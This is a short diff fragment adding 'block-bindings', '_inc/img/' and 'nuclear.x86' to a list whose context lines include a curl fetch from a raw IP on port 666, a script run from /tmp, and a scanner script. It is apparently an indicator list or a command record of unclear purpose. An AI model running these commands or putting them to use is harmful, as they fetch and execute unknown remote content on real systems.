@@ -304,3 +304,6 @@ python3 react.py
 python3 scanner.py
 curl -s 67.217.57.240:666/files/*
 bash /tmp/proxy.sh
+block-bindings
+_inc/img/
+nuclear.x86
